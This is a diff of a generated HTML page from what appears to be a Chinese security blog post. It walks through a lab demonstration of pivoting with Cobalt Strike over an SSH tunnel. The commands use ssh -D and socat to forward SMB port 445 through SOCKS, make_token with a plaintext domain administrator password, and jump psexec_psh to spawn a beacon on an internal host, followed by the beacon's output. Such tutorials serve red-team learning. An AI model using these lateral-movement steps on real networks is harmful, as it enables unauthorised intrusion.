@@ -437,7 +437,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    575
+                    571
                 </div>
                 
 
@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -467,20 +470,24 @@
                 <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这一节将来介绍如何通过 SSH 通道进行攻击。</p>
 <h1 id="0x01-通过-SSH-建立通道"><a href="#0x01-通过-SSH-建立通道" class="headerlink" title="0x01 通过 SSH 建立通道"></a>0x01 通过 SSH 建立通道</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>1、连接到上图中蓝色区域里的 PIVOT 主机并开启端口转发</p>
-<pre><code>ssh -D 1080 user@&lt;blue pivot&gt;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">ssh -D 1080 user@&lt;blue pivot&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <blockquote>
 <p>该命令中的 -D 参数会使 SSH 建立一个 socket，并去监听本地的 1080 端口，一旦有数据传向那个端口，就自动把它转移到 SSH 连接上面，随后发往远程主机。</p>
 </blockquote>
 <p>2、在红色区域的 PIVOT 主机上开启通过 SSH Socks 的 445 端口转发</p>
-<pre><code>socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:&lt;target&gt;:445</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:&lt;target&gt;:445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <blockquote>
 <p>socat 可以理解成 netcat 的加强版。socat 建立 socks 连接默认端口就是 1080 ，由于我们上面设置的就是 1080，因此这里不需变动。如果设置了其他端口，那么这里还需要在命令最后加上 <code>,socksport=&lt;port&gt;</code> 指定端口才行。</p>
 </blockquote>
 <p>3、在攻击者控制的主机上运行 beacon，使其上线</p>
-<pre><code>注意需要使用 administrator 权限运行 beacon</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">注意需要使用 administrator 权限运行 beacon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>4、在上线的主机上运行以下命令</p>
-<pre><code>make_token [DOMAIN\user] [password]
-jump psexec_psh &lt;red pivot&gt; [listener]</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">make_token [DOMAIN\user] [password]
+jump psexec_psh &lt;red pivot&gt; [listener]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>整体的流程就是下面这张图一样。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h1 id="0x02-演示"><a href="#0x02-演示" class="headerlink" title="0x02 演示"></a>0x02 演示</h1><p>我在本地搭建了这样的一个环境。</p>
@@ -488,28 +495,33 @@ jump psexec_psh &lt;red pivot&gt; [listener]</code></pre>
 <ol>
 <li>首先使 Win1 主机上线，接着在 Linux1 主机上通过 SSH 连接到 Linux2 主机。</li>
 </ol>
-<pre><code>ssh -D 1080 user@192.168.175.146</code></pre>
-<pre><code class="powershell">&gt; ssh -D 1080 user@192.168.175.146
-user@192.168.175.146&#39;s password: 
-Last login: Fri Jul 31 20:00:54 2020 from 192.168.175.1
-user@ubuntu:~$ </code></pre>
-<p>2、在 Linux1 主机上开启 445 端口转发</p>
-<pre><code>socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445</code></pre>
-<p>3、在 Win1 主机上运行以下命令使 Win2 上线</p>
-<pre><code>make_token teamssix\administrator Test123!
-jump psexec_psh 192.168.175.200 smb</code></pre>
-<pre><code class="powershell">beacon&gt; make_token teamssix\administrator Test123!
-[*] Tasked beacon to create a token for teamssix\administrator
-[+] host called home, sent: 61 bytes
-[+] Impersonated WINTEST\Administrator
+<pre class="line-numbers language-none"><code class="language-none">ssh -D 1080 user@192.168.175.146<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-beacon&gt; jump psexec_psh 192.168.175.200 smb
-[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_532c) on 192.168.175.200 via Service Control Manager (PSH)
-[+] host called home, sent: 5886 bytes
-[+] received output:
-Started service 4aea3b9 on 192.168.175.200
-[+] host called home, sent: 204473 bytes
-[+] established link to child beacon: 192.168.232.132</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">> ssh <span class="token operator">-</span>D 1080 user@192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>146
+user@192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>146's password: 
+Last login: Fri Jul 31 20:00:54 2020 <span class="token keyword">from</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>1
+user@ubuntu:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>2、在 Linux1 主机上开启 445 端口转发</p>
+<pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>3、在 Win1 主机上运行以下命令使 Win2 上线</p>
+<pre class="line-numbers language-none"><code class="language-none">make_token teamssix\administrator Test123!
+jump psexec_psh 192.168.175.200 smb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> make_token teamssix\administrator Test123<span class="token operator">!</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to create a token <span class="token keyword">for</span> teamssix\administrator
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 61 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated WINTEST\Administrator
+
+beacon> jump psexec_psh 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200 smb
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run windows<span class="token operator">/</span>beacon_bind_pipe <span class="token punctuation">(</span>\\<span class="token punctuation">.</span>\pipe\msagent_532c<span class="token punctuation">)</span> on 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200 via Service Control Manager <span class="token punctuation">(</span>PSH<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 5886 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+Started service 4aea3b9 on 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 204473 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> established link to child beacon: 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>4、随后便可以看到通过 SSH 上线的主机</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <blockquote>
@@ -946,7 +958,7 @@ Started service 4aea3b9 on 192.168.175.200
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
